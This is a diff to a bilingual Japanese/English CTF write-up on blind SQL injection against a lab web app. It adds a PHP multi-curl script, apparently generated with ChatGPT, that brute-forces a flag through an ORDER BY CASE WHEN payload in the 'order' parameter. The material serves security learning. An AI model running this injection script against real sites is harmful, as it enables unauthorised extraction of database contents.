@@ -51,7 +51,11 @@ False(order by date)
 
 I wanted to make the Payload so that the response code or Content Length was different, but I couldn't do it and UNION SELECT didn't work either.Since both True and False have the same Length, it's necessary to check the contents.
 
+元ネタ
 https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md
+
+SQL確認用
+https://sqliteonline.com/
 
 ### DB SQLite 3.XX
 ![image](https://github.com/yukaFUNAMI/THM_Writeup/assets/6504854/beed55e7-ccea-4f06-8d74-2f8be9eb1978)
@@ -76,10 +80,97 @@ Use the Intruder by one character and identify the letter from the response.
 
 If you do it all, you'll see that the other table name is todos and has 4 columns. flag has 1 column.
 
+
 ### flag
 ![image](https://github.com/yukaFUNAMI/THM_Writeup/assets/6504854/f6001604-2f12-4476-a94b-e81e4b6989bf)
 
 同じ要領でflag特定。
-Get flag in the same way.
+Get the flag value same way.
 
 🚩 Congratulations! Thank you for your time, Happy hacking. 🌕🍡🌕🍡🌕🍡
+
+
+## Omake
+
+![image](https://github.com/yukaFUNAMI/THM_Writeup/assets/6504854/eb8ffcbe-8e91-4c11-88a0-8edf14aa863f)
+
+今回はマルチのCURLで高速化をはかった。
+またもちゃっとGPTにつくってもらった。
+好みを学習したらしく最初と最後のMSGを自動でいれてくれた。感謝
+
+```
+<?php
+echo "------ START ----- \n";
+$flag = "";
+$FLAGLEN=38;
+$URL='http://10.10.143.81/';
+$SEARCHDATE='2023-08-01';
+$SEARCHDATELEN=101;
+$strings = array(
+    "0","1","2","3","4","5","6","7","8","9",
+    "a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z",
+    "A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z",
+    "!","#","$","%","&","(",")","~","=","|","^","-","`","{","[","@","]","}","*",":",";","+","<",">","%20",".",
+    "?","_" );
+
+for ($i = 0; $i < $FLAGLEN; $i++) {
+    // prm作成
+    $prm = array();
+    for ($j = 0; $j < count($strings); $j++) {
+        $prm[$j] = '?order=(CASE+WHEN(SUBSTRING((SELECT+*+FROM+flag),'.($i + 1).',1)=%27'.$strings[$j].'%27)+THEN+title+ELSE+date+END)';
+    }
+
+    // CURL
+    $mh = curl_multi_init();        // CURLマルチハンドルを初期化
+    $handles = array();
+
+    // 各URLに対してCURLハンドルを作成しマルチハンドルに追加
+    foreach ($prm as $prm) {
+        $ch = curl_init($URL.$prm);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_multi_add_handle($mh, $ch);
+        $handles[] = $ch;
+    }
+
+    // マルチハンドルで複数のリクエストを同時に実行
+    $running = null;
+    do {
+        curl_multi_exec($mh, $running);
+    } while ($running > 0);
+
+    // 各リクエストのレスポンスを処理
+    foreach ($handles as $ch) {
+        $response = curl_multi_getcontent($ch);
+        
+        // レスポンスを行ごとに分割
+        $responseLines = explode("\n", $response);
+
+        // 行ごとに "2023-08-01" を探す
+        foreach ($responseLines as $lineNumber => $line) {
+            if (strpos($line, $SEARCHDATE) !== false) {
+                $target = curl_getinfo($ch, CURLINFO_EFFECTIVE_URL);
+                //$target = http://10.10.143.81/?order=(CASE+WHEN(SUBSTRING((SELECT+*+FROM+flag),1,1)=%27c%27)+THEN+title+ELSE+date+END)
+                //echo 'URL: ' . $target . ' の行数: ' . $lineNumber."\n";
+                if ($lineNumber != $SEARCHDATELEN) {
+                    // flagの文字列の切り出し
+                     if (preg_match('/%27.%27/', $target, $char)) {
+                        $str = str_replace('%27', '', $char[0]);
+                        echo $str;
+                        $flag = $flag.$str;
+                    }
+                }
+            }
+        }
+        curl_multi_remove_handle($mh, $ch);
+        curl_close($ch);
+    }
+
+    curl_multi_close($mh);
+
+    }
+//echo "FLAG:".$flag."\n";
+echo "\n------ END ------- \n";
+?>
+```
+
+
